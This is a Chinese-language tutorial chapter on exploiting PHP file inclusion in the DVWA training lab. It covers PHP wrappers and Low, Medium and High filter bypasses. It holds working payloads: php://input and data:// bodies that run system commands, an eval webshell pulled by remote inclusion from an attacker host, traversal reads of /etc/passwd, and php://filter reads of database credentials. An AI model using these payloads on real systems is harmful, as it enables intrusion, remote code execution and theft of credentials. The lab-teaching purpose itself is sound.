| 6 | **php://input 远程代码执行（allow_url_include = On 才生效！）** | Burp 抓包：GET 部分 `?page=php://input`，然后**请求体**（POST body）写一行 PHP：`<?php system('id;uname -a;whoami;pwd'); ?>` → Send | 响应体里直接出现 id、uname、whoami 命令结果 = RCE！ | 【啥响应都没有 / 只有 Warning】→ ① allow_url_include 不是 On（回到步骤 0 查）；② 你用的是 Burp 的 GET 请求但忘了把请求体写进去（php://input 读请求体，POST/PUT 都行，GET 也能有 body）；③ 换成 POST 方法更稳：改成 POST 提交 page 参数 + body 写 php 代码 |
| 7 | **RFI 远程文件包含（allow_url_fopen + allow_url_include 全 On 才行）** | 攻击机 Kali 里写一句话：`echo '<?php echo "RFI_OK_".php_uname(); ?>' \| sudo tee /var/www/html/shell.txt` → 确保 `sudo systemctl start apache2` 开了 → 靶场地址栏填：<br>`?page=http://Kali攻击机IP/shell.txt` | 页面出现 `RFI_OK_Linux hostname ...` ✅ | 【直接包含失败】→ 排查：① Kali 防火墙挡住 80 端口：`sudo ufw allow 80/tcp`；② 靶场 ping 不通 Kali（网络桥接/NAT 问题）；③ 你写的文件名后缀是 .php 但是你 include 远程 .php 的话，Kali Apache 会先解析成 HTML 返回！→ **必须用 .txt 后缀！**（让远程 Apache 原样返回 PHP 源码，靶场这边收到源码再 include 才会执行） |
| 8 | **RFI 升级：直接拿 WebShell（蚁剑/菜刀一句话）** | Kali 上 `/var/www/html/cmd.txt` 写：`<?php @eval($_REQUEST['x']); ?>` → 靶场包含：`?page=http://KaliIP/cmd.txt` 先看到空白没报错（成功了）→ 再访问：`?page=http://KaliIP/cmd.txt&x=system('id');` | 访问第二条 URL 出现 id 命令输出 ✅ → 之后 x 参数传啥 PHP 就执行啥，直接用蚁剑连 URL（密码 x）就拿到 Webshell | 【eval 没执行 / Warning】→ ① cmd.txt 真内容是不是 PHP（跑 `cat /var/www/html/cmd.txt` 看）；② `@eval` 前面的 `@` 别删（屏蔽警告）；③ x 参数用 POST 传更隐蔽，改成 POST `x=phpinfo();` 试试 |

> 💡 **Low 查错口诀**：`allow_url_fopen` 管不管理远程文件，`allow_url_include` 管不管理 php://input + RFI。**php://filter 读源码只需要 fopen 开着就行，最稳！** 出现 include path 报错不是坏事——它告诉你当前相对路径的 include 搜索顺序，能帮你猜绝对路径。

---

## 8.5 PHP伪协议详解（重点中的重点！）

小伙伴们，接下来讲的这个东西，是本章的**重中之重**，也是文件包含漏洞里最实用、最常用的技巧——**PHP伪协议**！

这玩意儿一定要掌握，不管是CTF比赛还是实战渗透，都经常用到。我会尽量讲得详细、通俗易懂，大家跟上节奏！

### 8.5.1 什么是伪协议？

首先，什么是伪协议呢？

咱们平时说的"协议"，比如 `http://`、`https://`、`ftp://`，这些都是真实的网络协议，用来访问不同地方的资源。

而PHP的**伪协议**，是PHP自己内置的一些特殊的"协议头"，它们看起来像是协议（比如 `php://`、`data://`、`phar://`），但实际上并不是真正的网络协议，而是PHP提供的**特殊功能入口**。

你可以把它们理解为PHP的"隐藏技能"——当文件包含函数遇到这些特殊的"路径"时，不会真的去读文件，而是触发一些特殊的功能。

比如：
- `php://filter` 可以用来读取文件源码（不执行）
- `php://input` 可以读取POST数据
- `data://` 可以直接执行PHP代码
- ……

这些伪协议配合文件包含漏洞，就能玩出各种花来！

接下来，咱们一个个来讲，从最常用的开始。

### 8.5.2 php://filter：读源码神器（最常用！）

`php://filter` 是**最最最常用**的伪协议，没有之一！大家一定要把它刻在脑子里！

#### 它是干嘛的？

它的作用是：**读取PHP文件的源代码，并且不会执行它！**

哎？等一下，文件包含不就是把文件内容拿过来执行吗？为啥要不执行呢？

这是个好问题！我来给大家解释一下。

假设现在有一个文件 `config.inc.php`，里面是数据库的配置：
```php
<?php
$db_user = 'root';
$db_pass = 'root123456';
$db_name = 'dvwa';
?>
```

如果我们直接用文件包含去读这个文件：
```
?page=../../config/config.inc.php
```

会发生什么？这个文件里的PHP代码会被**执行**！但是它只是定义了几个变量，没有输出任何内容。所以你在页面上**什么都看不到**——密码也看不到，啥都没有。

这就很尴尬了对吧？我知道文件在那儿，但我就是看不到里面写了啥。

怎么办呢？这时候 `php://filter` 就派上用场了！

`php://filter` 可以把文件内容**用Base64编码之后再输出**。Base64编码过的内容，PHP就不会把它当代码执行了，而是直接输出到页面上。我们拿到Base64字符串后，再解码一下，就能看到文件的源码了！

妙不妙？😏

#### 基本用法

`php://filter` 的用法是这样的：
```
php://filter/read=convert.base64-encode/resource=文件路径
```

咱们来拆解一下：
- `php://filter`：伪协议的名字
- `read=convert.base64-encode`：读取的时候，用Base64编码转换一下
- `resource=文件路径`：要读取的文件路径

连起来就是：用filter这个伪协议，读取指定文件，用Base64编码后输出。

#### 实战演示：读取DVWA的配置文件

光说不练假把式，咱们来实战一下！咱们的目标是——读取DVWA的配置文件 `config.inc.php`，拿到数据库密码！

首先，咱们得知道 `config.inc.php` 在哪儿。一般来说，DVWA的配置文件在 `config/` 目录下，也就是：
```
../../config/config.inc.php
```

（因为当前在 `vulnerabilities/fi/` 目录，往上两级就是DVWA根目录，然后 `config/config.inc.php`）

好，那咱们构造完整的URL：
```
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=../../config/config.inc.php
```

把这个URL复制到浏览器地址栏，访问一下——

哎？页面上出现了一大串乱七八糟的字符，类似这样：
```
PD9waHINCg0KCSMgaWYgKy0rIERWV0EgKy0rDQoJIyBi......（后面还有很长一串）
```

这就是Base64编码后的内容！虽然它看起来乱，但是它包含了文件的所有信息！

接下来，咱们需要把这串Base64**解码**，就能看到原始内容了。

#### 怎么解码Base64？

解码Base64的方法有很多，我给大家介绍几种常用的：

**方法一：在线网站解码**

这是最简单的方法，直接搜"Base64在线解码"，随便找个网站，把字符串粘进去，点解码就行。

**方法二：用Burp Suite解码**

Burp的Decoder模块可以解码Base64，把字符串粘进去，选Base64 decode就行。

**方法三：用PHP命令解码**

如果你电脑有PHP环境，可以在命令行执行：
```bash
php -r "echo base64_decode('PD9waHAg...');"
```

**方法四：用Python解码**

有Python环境的话：
```python
import base64
print(base64.b64decode('PD9waHAg...').decode())
```

随便用哪种方法，解码之后，你就能看到类似这样的内容：

```php
<?php

# if on installation process
#...

$_DVWA = array();
$_DVWA[ 'db_server' ]   = '127.0.0.1';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ]     = 'root';
$_DVWA[ 'db_password' ] = 'root';
$_DVWA[ 'db_port'] = '3306';
?>
```

看到了吗？数据库的用户名（root）、密码（root）、库名（dvwa）全都拿到了！🎉

这就是 `php://filter` 的威力！以后只要遇到文件包含漏洞，想读PHP源码，就用它！

#### 小技巧：其他编码方式

除了 `convert.base64-encode`，`php://filter` 还有其他一些转换方式，比如：
- `convert.base64-decode`：Base64解码
- `string.rot13`：ROT13编码
- `string.toupper`：转大写
- `string.tolower`：转小写

不过最常用的还是Base64编码，大家把这个记住就行。

### 8.5.3 php://input：POST数据当PHP代码执行

第二个常用的伪协议是 `php://input`，这个也很厉害！

#### 它是干嘛的？

`php://input` 的作用是：**读取HTTP POST请求的原始数据**。

如果配合文件包含漏洞，会发生什么呢？

想象一下：
1. 你构造URL：`?page=php://input`
2. 服务器用 `include('php://input')` 去包含
3. `php://input` 返回的是POST请求的数据
4. 所以include就把POST数据当成PHP代码执行了！

哇！这就意味着——**你在POST请求里写什么PHP代码，服务器就执行什么！**

是不是很吊？😎

#### 前提条件

不过，`php://input` 也有个前提条件：**需要 `allow_url_include = On`**。

哎？怎么又是这个？因为 `php://input` 虽然是伪协议，但PHP也把它归到"URL形式的include"里了，所以需要开 `allow_url_include`。

不过没关系，咱们学习嘛，可以自己开一下试试效果。

#### 实战演示

好，咱们来演示一下怎么用。

首先，你需要一个抓包工具，比如Burp Suite。咱们用Burp来抓包改包。

**步骤一：抓包**

用浏览器访问DVWA的文件包含页面，然后用Burp抓包。

**步骤二：改包**

把请求改成这样：

```
GET /dvwa/vulnerabilities/fi/?page=php://input HTTP/1.1
Host: 127.0.0.1
...（其他请求头）

<?php system('whoami'); ?>
```

等等，不对——因为 `php://input` 读取的是POST数据，所以咱们得把请求方法改成POST，然后把PHP代码放在请求体里。

正确的请求应该是这样的：

```http
POST /dvwa/vulnerabilities/fi/?page=php://input HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

<?php system('whoami'); ?>
```

简单说就是：
- URL里写 `?page=php://input`
- 请求方法改成POST
- 请求体里写你要执行的PHP代码

然后发送这个请求，看看响应——

如果成功的话，你就能看到 `whoami` 命令的输出了！也就是当前运行PHP的用户名。

你还可以执行其他命令，比如：
```php
<?php system('ipconfig'); ?>   // 看IP
<?php system('dir'); ?>        // 看文件列表
<?php phpinfo(); ?>            // 看phpinfo
```

想执行啥就执行啥，爽不爽？😏

### 8.5.4 data://：直接把代码写在URL里

第三个伪协议是 `data://`，这个也能用来执行PHP代码。

#### 它是干嘛的？

`data://` 是一种数据URI协议，它允许你**直接把数据内容写在URL里**，而不用指向一个真实的文件。

比如：
```
data://text/plain,HelloWorld
```

这个"文件"的内容就是 `HelloWorld`。

如果配合文件包含的话——你把PHP代码写在data://里，服务器包含它的时候，就会执行你的PHP代码！

#### 前提条件

和 `php://input` 一样，`data://` 也需要 `allow_url_include = On` 才能用。

#### 用法一：明文形式

最简单的用法：
```
?page=data://text/plain,<?php phpinfo();?>
```

意思是：包含一个data协议的"文件"，内容类型是纯文本，内容是 `<?php phpinfo();?>`。

服务器一包含，就执行了 `phpinfo()`。

但是要注意，URL里的一些特殊字符（比如 `<`、`>`、空格）最好URL编码一下，不然可能出问题。编码后的版本：
```
?page=data://text/plain,%3C%3Fphp%20phpinfo%28%29%3B%3F%3E
```

#### 用法二：Base64编码形式

有时候，直接写PHP代码可能会被过滤，这时候可以用Base64编码一下。

用法：
```
data://text/plain;base64,Base64编码后的内容
```

比如 `<?php phpinfo();?>` 用Base64编码后是 `PD9waHAgcGhwaW5mbygpOz8+`，所以：
```
?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

这样也能执行PHP代码。

### 8.5.5 file://：本地文件协议

`file://` 这个协议大家可能比较熟悉，它就是用来访问本地文件的。

用法很简单：
```
?page=file://文件的绝对路径
```

比如：
```
?page=file://C:/windows/system32/drivers/etc/hosts
```

这个其实和直接写路径差不多，区别不大。知道有这么个东西就行。

### 8.5.6 phar:// 和 zip://：压缩包文件包含

接下来这两个伪协议比较特殊：`phar://` 和 `zip://`，它们可以用来**读取/包含压缩包里的文件**。

这玩意儿有啥用呢？

给大家举个场景：假设网站有文件上传功能，但是只允许上传图片文件（.jpg、.png、.gif）。你上传了一个图片马，但是没法直接执行。

这时候，如果网站还有文件包含漏洞，你就可以：
1. 把PHP代码压缩成zip包
2. 把zip包改后缀为.jpg，上传上去
3. 用 `phar://` 或者 `zip://` 去包含这个"图片"里的PHP文件

这样就能执行代码了！

是不是很巧妙？这就是所谓的"**文件上传+文件包含**"组合拳。

#### phar:// 用法

`phar://` 原本是PHP用来处理PHAR归档文件的（PHAR是PHP的一种压缩包格式，类似Java的JAR），但它也能处理普通的zip文件。

用法：
```
phar://压缩包路径/压缩包里的文件路径
```

举个例子：你有个zip包叫 `shell.zip`，里面有个 `shell.php`。你把 `shell.zip` 改名为 `shell.jpg` 上传到了服务器，路径是 `./upload/shell.jpg`。

那你可以这样包含：
```
?page=phar://./upload/shell.jpg/shell.php
```

这样就能执行压缩包里的 `shell.php` 了！

#### zip:// 用法

`zip://` 和 `phar://` 类似，也是用来读取zip包里的文件的。

用法略有不同：
```
zip://压缩包路径%23压缩包里的文件路径
```

注意：用的是 `%23`（也就是URL编码的 `#`）来分隔压缩包路径和内部文件路径，而不是斜杠。

同样的例子：
```
?page=zip://./upload/shell.jpg%23shell.php
```

也能达到同样的效果。

**注意：** 这两个伪协议的使用场景相对高级一些，新手先知道有这么个东西就行，等后面学到文件上传的时候，咱们再结合起来用。

### 8.5.7 伪协议小结

好了，伪协议讲了这么多，给大家总结一下，方便记忆：

| 伪协议 | 作用 | 是否需要allow_url_include | 常用程度 |
|--------|------|--------------------------|---------|
| `php://filter` | 读取PHP文件源码（Base64编码输出） | 不需要 | ⭐⭐⭐⭐⭐ |
| `php://input` | 把POST数据当PHP代码执行 | 需要 | ⭐⭐⭐⭐ |
| `data://` | 直接在URL里写PHP代码执行 | 需要 | ⭐⭐⭐⭐ |
| `file://` | 读取本地文件 | 不需要 | ⭐⭐ |
| `phar://` | 包含压缩包里的文件 | 不需要 | ⭐⭐⭐ |
| `zip://` | 包含压缩包里的文件 | 不需要 | ⭐⭐⭐ |

**划重点：**
- `php://filter` 是最重要的！一定要会用！
- `php://input` 和 `data://` 可以执行代码，但需要开 `allow_url_include`
- `phar://` 和 `zip://` 可以用来绕过文件上传限制，配合文件上传漏洞使用

好，伪协议就讲到这儿。接下来咱们升级难度，看看Medium级别怎么玩！

---

## 8.6 Medium级别：过滤了怎么办？看我花式绕过！

好，Low级别咱们轻轻松松就通关了。现在咱们把难度调到 **Medium**，继续挑战！

### 8.6.1 先试试Low的方法行不行

调到Medium后，咱们先用Low的payload试试，看看还行不行。

试试读phpinfo：
```
?page=../../phpinfo.php
```

嗯……好像不行了？或者试试读系统文件？
```
?page=C:/windows/system32/drivers/etc/hosts
```

也不行？那试试伪协议呢？
```
?page=php://filter/read=convert.base64-encode/resource=../../config/config.inc.php
```

哎？这个好像还能用？

没关系，咱们先看看Medium级别到底过滤了啥。

### 8.6.2 查看源代码分析

还是老办法，点击 **View Source** 看看源码：

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?>
```

哦！原来如此！Medium级别做了两个过滤：

1. **把 `http://` 和 `https://` 替换成空字符串** —— 就是想阻止远程文件包含（RFI）
2. **把 `../` 和 `..\` 替换成空字符串** —— 就是想阻止目录遍历（不让你往上跳目录）

就这？就这过滤？那也太简单了，分分钟绕过给你看！😏

### 8.6.3 绕过 http:// 过滤

先来说说怎么绕过 `http://` 的过滤。

#### 方法一：大小写绕过

你是不是只过滤了小写的 `http://`？那我用大写的 `HTTP://` 行不行？

PHP的 `include` 函数对协议名的大小写是不敏感的，`HTTP://` 和 `http://` 是一样的效果。

所以试试：
```
?page=HTTP://你的服务器/shell.txt
```
或者：
```
?page=HttP://你的服务器/shell.txt
```

如果服务器只是简单替换小写的 `http://`，那大小写混合就能绕过！

#### 方法二：用其他伪协议

你只过滤了 `http://` 和 `https://`，那我用 `data://`、`php://input` 行不行？

当然可以！

比如用 `data://` 执行代码：
```
?page=data://text/plain,<?php phpinfo();?>
```

或者用 `php://input`：
```
?page=php://input （POST数据写PHP代码）
```

这些都不在黑名单里，自然就能绕过。

### 8.6.4 绕过 ../ 过滤

接下来是重点——怎么绕过 `../` 的过滤？

这个就更有意思了，方法有很多种，咱们一个个来。

#### 方法一：双写绕过（最经典！）

什么是双写绕过呢？

你看，代码里用的是 `str_replace`，它会把 `../` 替换成空。但是它**只替换一次**！

那如果我写 `....//` 呢？

咱们来分析一下：
- 原始字符串：`....//`
- 把中间的 `../` 替换掉：`..` + `../` + `/` → 把 `../` 去掉，变成 `../`

哎？！替换之后，居然又变成了 `../`！

这就是**双写绕过**！因为过滤只做一次，所以你写两个 `../` 叠在一起，过滤掉一个，还剩一个。

比如：
- `....//` → 过滤后变成 `../`
- `........//` → 过滤后变成 `../` 两个，也就是 `../../`

太妙了是不是？😆

那咱们来实战一下，用双写绕过读 `phpinfo.php`：

原来的payload是 `../../phpinfo.php`，现在把每个 `../` 都改成 `....//`：

```
?page=....//....//phpinfo.php
```

咱们来验证一下：
- `....//` → 过滤掉 `../` → `../`
- 第二个 `....//` → 过滤掉 `../` → `../`
- 所以最终变成 `../../phpinfo.php`

完美！访问一下试试——

成功了！🎉

#### 方法二：URL编码绕过

除了双写，还可以用**URL编码**来绕过。

原理是：有些过滤函数是在URL解码之前运行的，而PHP的`$_GET`是已经解码过的。

啥意思呢？举个例子：

`../` 用URL编码一下，`.` 编码成 `%2e`，`/` 编码成 `%2f`，所以：
```
../ → %2e%2e%2f
```

如果服务器的过滤是直接匹配字符串 `../`，而没有先URL解码，那 `%2e%2e%2f` 就匹配不上，就能绕过了。

不过在DVWA的Medium级别里，`$_GET` 已经是解码后的了，所以简单的URL编码可能不行——那咱们就来个**双重URL编码**！

什么是双重URL编码？就是编码两次：
- 第一次编码：`.` → `%2e`，`/` → `%2f` → 得到 `%2e%2e%2f`
- 第二次编码：`%` → `%25`，所以 `%2e` 变成 `%252e`，`%2f` 变成 `%252f`

最终结果：
```
../ → %252e%252e%252f
```

为什么双重编码能绕过？因为：
1. 服务器收到请求，先做一次URL解码，`%252e%252e%252f` 变成 `%2e%2e%2f`
2. 服务器用 `%2e%2e%2f` 去匹配 `../`，匹配不上，所以没过滤
3. 然后PHP的include函数可能会再做一次解码，`%2e%2e%2f` 又变成了 `../`

这样就绕过了！

不过这个方法不一定对所有环境都有效，要看具体情况。知道有这么个思路就行。

#### 方法三：绝对路径绕过

还有一种更简单的方法——如果服务器是Windows的话，直接用**绝对路径**不就行了？

你过滤的是 `../`，那我不用相对路径，我用绝对路径：
```
?page=C:/windows/system32/drivers/etc/hosts
```

这里面没有 `../`，你总不能也过滤了吧？

当然，这个方法对Linux可能不太好使，因为你不一定知道网站的绝对路径。但如果能知道的话，用绝对路径也是个好思路。

### 8.6.5 伪协议能不能用？

最后再确认一下，Medium级别里，`php://filter` 还能用吗？

当然可以！因为 `php://filter` 既不包含 `http://`，也不包含 `../`（除非你resource里写了`../`），所以完全不受影响。

咱们来试试读配置文件：
```
?page=php://filter/read=convert.base64-encode/resource=....//....//config/config.inc.php
```

哎？等一下，resource里的路径也用了 `../`，那是不是也会被过滤？

是的！所以resource里的路径也要用双写绕过：
```
?page=php://filter/read=convert.base64-encode/resource=....//....//config/config.inc.php
```

这样就可以了！或者如果你知道绝对路径的话，直接写绝对路径也行。

### 8.6.6 Medium级别小结

Medium级别就讲到这儿。总结一下：
- 过滤了 `http://`、`https://` → 大小写绕过、换其他协议
- 过滤了 `../` → 双写绕过、编码绕过、绝对路径绕过

还是那句话：**黑名单过滤是不可靠的，总会有办法绕过的。**

### ✅ 表 8-2 · Medium 级别通关速查 & 失败对照表（http:// 被删 + ../ 被删 = 大小写/双写/编码/绝对路径四大绕过法）

DVWA Medium 级 FI 源码里有两个独立的 `str_replace`（重点：**它是大小写敏感的！`str_replace` 不是 `str_ireplace`** — 面试就考这个区别）：① 把 `http://` `https://` 替换成空字符串；② 把 `../` `..\\` 替换成空。按下面 6 条 payload 顺序一个个试，基本都能前 3 个就过：

| 步骤 | 先做什么 | 地址栏敲什么（**按优先级从上往下测！**） | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
|---|---|---|---|---|
| 0 | 确认 Medium 真的生效 + View Source 抄黑名单 | 切 medium → Submit → 刷新 → 进 FI → View Source 把那两行 str_replace 抄下来 | 确认是 `str_replace( array( 'http://', 'https://' ), '', $file );` + `str_replace( array( '../', '..\\\\' ), '', $file );`（都没有 i 参数 = 大小写敏感）+ Low 版 `?page=../../../../etc/passwd` 和 `?page=http://KaliIP/shell.txt` 都失败 | 【Low payload 还有一个成功】→ 没切到 Medium！重新切 + Ctrl+Shift+R 强刷缓存 |
| 1 | 绕过法 ① 最经典最稳：**大小写绕过 http 协议**（str_replace 大小写敏感！大写字母一律没匹配） | 直接写：`?page=HTTP://Kali攻击机IP/shell.txt`（全大写 HTTP://）或者混合写 `?page=HtTp://KaliIP/shell.txt` | 包含成功！显示你 shell.txt 里的内容（例：RFI_OK_Linux）✅ | 【还是失败 PHP Warning include(HTTP://...): failed】→ ① 大小写绕过只对 **str_replace** 生效，如果你 View Source 里看到的是 **str_ireplace**（有个 i = 大小写不敏感）那这个方法没用！跳到下一个；② allow_url_include 是不是又变回 Off 了？（有些环境重启 Apache 就恢复，再查一次 phpinfo） |
| 2 | 绕过法 ②：**双写绕过 http**（`hthttp://tp://xxx` → str_replace 删掉中间那 http:// → 剩下外面的 http://） | 写：`?page=hthttp://tp://KaliIP/shell.txt` 或者 `?page=httpshttps://://KaliIP/shell.txt`（把要匹配的字符串夹在中间）| 包含成功 ✅ | 【没用】→ 你的版本是先删 http 再删 https（顺序不一样），换 `hthttps://tps://`（把 https 也双写）或测一下 **你删完第一层后剩下的字符串会不会刚好又形成 http://** — 可以 Burp Intruder 跑 10 个组合 |
| 3 | 绕过法 ③ 第二经典：**双写绕过 ../**（Medium 只替换一次 `../` → 不递归！这是 90% DVWA Medium 的真实写法）| Low 的 `?page=../../../../etc/passwd` 改成 → `?page=....//....//....//....//etc/passwd`（每对 ../ 写成 ....//，中间那个 ../ 被删掉，剩下刚好还是 ../） | 显示 /etc/passwd ✅ | 【还失败？】→ 你这版本是 **递归**删 ../（while 循环删到没了为止），那双写没用，跳 ④⑤⑥；另外试试另一种双写布局：`?page=..././..././..././..././etc/passwd` |
| 4 | 绕过法 ④：**URL 编码绕过 ../**（注意浏览器会自动解一次码，所以要双重编码！） | 单层编码（很多 PHP 环境 `$_GET` 自动解码等于没传）: `..%2f` → 一般不行，所以直接上 **双重编码**：`%252e%252e%252f`（先把 `../` 每个字符 URL 编码得到 %2e%2e%2f，再把 `%` 编码成 %25 = %252e%252e%252f） | 显示 /etc/passwd ✅ | 【还是失败】→ 你的 target 不做二次解码，那换绝对路径绕过（下一条 100% 管用） |
| 5 | 绕过法 ⑤ 100% 必中（只要你知道绝对路径）：**绝对路径绕过！黑名单完全管不到** | 直接填：`?page=/etc/passwd`（Linux）或 `?page=C:\Windows\win.ini`（Windows）→ **没有 ../ 没有 http，黑名单一个都匹配不上** | 直接出内容 ✅ | 【你不知道靶场绝对路径啊？】→ 这是唯一问题：① 跑 phpinfo() 看 DOCUMENT_ROOT；② 通过步骤 2 的 RFI 拿 shell 之后 `pwd` 看一眼；③ Low 级别 Warning 里会打印 include_path，告诉你当前相对路径拼接前缀是啥 → 推绝对路径 |
| 6 | 别忘了老朋友 **php://filter**（协议头是 php://，http/https 黑名单一个都不匹配！） | 还是原来的配方：`?page=php://filter/convert.base64-encode/resource=/etc/passwd`（直接写绝对路径，php:// 不会被 Medium 的过滤拦） | 出 base64 = 成功 ✅ → 解码得到文件内容 | 【php://filter 也拦了？】→ 极少 DVWA 版本会写进黑名单，如果真被拦，换 `data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=`（data 伪协议，allow_url_include=On 时可用）|

> 💡 **Medium 查错咒语**：黑名单一个个试，先 http/https 搞大小写/双写 → 再 ../ 搞双写/编码 → 不行就上绝对路径。**真的卡 10 分钟以上，View Source 把那两个 str_replace 数组和参数顺序抄下来，拿个文本编辑器手工模拟 "替换一次后剩下啥" 就知道 payload 该怎么写了。**

---

## 8.7 High级别：更严格的过滤怎么破？

好，继续升级！把难度调到 **High**，看看这关又有什么花样。

### 8.7.1 先试试之前的方法

老规矩，先把之前的payload都试一遍，看看哪些还能用。

双写 `../`？试试：
```
?page=....//....//phpinfo.php
```

嗯……好像不行了。

伪协议呢？
```
?page=php://filter/read=convert.base64-encode/resource=../../config/config.inc.php
```

也不行？

那来看看源码吧，看看High级别到底搞了啥。

### 8.7.2 查看源代码分析

点击 **View Source**：

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    return;
}

?>
```

哦！High级别玩了个新花样——它用了 `fnmatch` 函数，要求文件名**必须以 `file` 开头**，否则就报错！

```php
if( !fnmatch( "file*", $file ) && $file != "include.php" )
```

翻译一下：
- 如果文件名不是以 `file` 开头的
- 并且文件名也不是 `include.php`
- 那就报错，不包含

所以现在的问题变成了：**怎么让文件名以 `file` 开头，但又能读到我们想读的文件？**

这怎么办呢？别着急，咱们有办法！

### 8.7.3 方法一：%00 截断（经典老技巧）

第一个方法，也是最经典的方法——**%00截断**！

#### 什么是%00截断？

`%00` 是什么？它是ASCII码为0的字符，也就是**空字符**（Null Byte）。

在C语言里，字符串是以 `\0`（也就是%00）作为结束标志的。PHP的底层是C语言写的，所以在老版本的PHP里，当遇到 `%00` 时，会认为字符串到这儿就结束了，后面的内容会被忽略掉。

这有啥用呢？举个例子：

假设我们输入的文件名是：
```
file1.php%00../../../../etc/passwd
```

PHP的 `fnmatch` 函数看到的是整个字符串，它以 `file` 开头，所以检查通过了。

但是 `include` 函数遇到 `%00` 时，会认为文件名到 `file1.php` 就结束了？不对不对——等一下，我搞反了。

应该是这样：我们想让 `fnmatch` 检查通过（必须以file开头），但实际包含的是我们想要的文件。

所以正确的姿势是：
```
file1.php/../../../../etc/passwd%00
```

不对不对，再想想……

哦，对了，应该是这样：

后台代码可能是这样的逻辑（举个例子）：
```php
include('pages/' . $file . '.php');
```

这时候用户传的是 `file` 开头的文件名，后台自动加上前缀和后缀。这时候 `%00` 截断就有用了——后面的 `.php` 会被截断掉。

但是在DVWA的High级别里，情况有点不一样。DVWA的代码是直接 `include($file)`，但是要求 `$file` 必须以 `file` 开头。

那怎么办呢？我们能不能构造一个文件名，它**是以file开头的**，但实际指向另一个文件？

哎？用 `file` 协议不就行了？！

等等，`file://` 也是以 `file` 开头的呀！咱们来看看：

`file://C:/windows/system32/drivers/etc/hosts` —— 这个字符串是不是以 `file` 开头？是的！

那 `fnmatch("file*", $file)` 能不能匹配上？

这就看 `fnmatch` 是怎么匹配的了。如果 `*` 能匹配 `://...` 这些东西，那 `file://...` 就能通过检查！

哇！这岂不是……

咱们来试试！

### 8.7.4 方法二：用 file:// 协议绕过开头限制

对呀！`file://` 协议本身就是以 `file` 开头的，完美符合条件！

那咱们构造这样的payload：
```
?page=file://C:/windows/system32/drivers/etc/hosts
```

这个字符串是以 `file` 开头的，`fnmatch("file*", $file)` 应该能匹配上！

然后include函数遇到 `file://` 协议，就会去读对应的本地文件——完美！

咱们来试试能不能成功。

**注意：** 这个方法能不能成，取决于 `fnmatch` 函数的匹配方式。在某些环境下可能不行，但思路是对的。

如果不行的话，咱们还有其他办法。

### 8.7.5 方法三：%00截断的另一种用法

再来说说 `%00` 截断。虽然刚才的思路有点绕，但 `%00` 截断确实是一个经典技巧，大家有必要了解一下。

#### 适用场景

`%00` 截断最典型的适用场景是：后台代码会给文件名自动加后缀。

比如：
```php
<?php
$file = $_GET['page'];
include($file . '.php');  // 自动加了.php后缀
?>
```

这时候你想读 `../../etc/passwd`，但后台会自动加上 `.php`，变成 `../../etc/passwd.php`——文件不存在，就读不到了。

这时候 `%00` 截断就派上用场了：
```
?page=../../etc/passwd%00
```

PHP看到 `%00`，就认为字符串结束了，后面的 `.php` 就被忽略了。实际包含的还是 `../../etc/passwd`。

是不是很神奇？

#### 前提条件

但是！`%00` 截断有两个很重要的前提条件：

1. **PHP版本 < 5.3.4** —— PHP 5.3.4 之后修复了这个问题
2. **magic_quotes_gpc = Off** —— 如果GPC开启的话，`%00` 会被转义，就没用了

所以这是一个很老的漏洞了，现在基本见不到了。但是作为历史经典，大家还是要知道一下。

### 8.7.6 方法四：路径长度截断（Windows特性）

还有一个更偏门的技巧——**路径长度截断**，这是Windows系统的一个特性。

原理是：Windows系统下，文件名有长度限制（大概256个字符？），如果路径太长，超过了限制，后面的内容就会被忽略。

所以你可以构造一个很长的路径，在后面加上你想读的文件，然后利用长度截断，把后面的后缀切掉。

比如：
```
?page=file1.php/././././...（省略很多个./）..././../../etc/passwd
```

因为路径太长了，Windows处理的时候会截断，后面的内容就没了。

这个技巧非常偏门，而且只在特定环境下有效。大家了解一下就行，不用深究。

### 8.7.7 High级别小结

High级别就讲到这儿。总结一下：
- High级别限制了文件名必须以 `file` 开头
- 可以尝试用 `file://` 伪协议绕过（因为file://本身就是file开头）
- 老版本PHP可以用 `%00` 截断
- Windows下可以尝试路径长度截断

**重要提示：** High级别的绕过方法可能因环境而异，不一定都能成功。重要的是理解思路——当遇到限制时，要想办法"钻空子"。

### ✅ 表 8-3 · High 级别通关速查 & 失败对照表（必须以 `file` 开头 = fnmatch('file*', $file) 四种绕过思路）

DVWA High 级 FI 源码核心就一行：`if( !fnmatch( 'file*', $file ) && $file != 'include.php' ) die( 'ERROR: File name is not allowed.' );` 即文件名**必须以 `file` 开头**（或就是 include.php），否则直接报错退出。下面四条路线按顺序测：

| 步骤 | 先做什么 | 地址栏敲什么 payload（**按顺序测**） | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
|---|---|---|---|---|
| 0 | 切 High + 确认 fnmatch 生效 | 切 high → Submit → 刷新 → 进 FI → 先拿 Low 版 `?page=../../../../etc/passwd` 测 | 出现红色 **ERROR: File name is not allowed.** 这句报错 = High 生效 ✅ | 【还是原来的 Warning 没有这个 ERROR 报错】→ 没切到 High！重新切 + 清缓存 + 刷新 |
| 1 | 🏆 **绕过法 ① 95% 环境必中：`file://` 伪协议 + 绝对路径**（`file://` 本来就以 `file` 开头！fnmatch 完美通过） | Linux 靶场写：<br>`?page=file:///etc/passwd`（三个斜杠：file:// + /etc/passwd 的 /）<br>Windows 靶场写：<br>`?page=file://C:/Windows/win.ini` | 页面显示 /etc/passwd / win.ini 内容 ✅🎉 | 【啥都没出 / Warning】→ ① 三个斜杠别写成两个：`file://etc/passwd` 是错的，必须三个 `/`；② 绝对路径写错了（/etc/passwd 真的存在吗，靶场是 Docker 精简版可能没这个文件 → 换 `file:///etc/hostname` 或 `file:///proc/version`）；③ Windows `file://C:\...` 反斜杠有时会被吞，换成正斜杠 / |
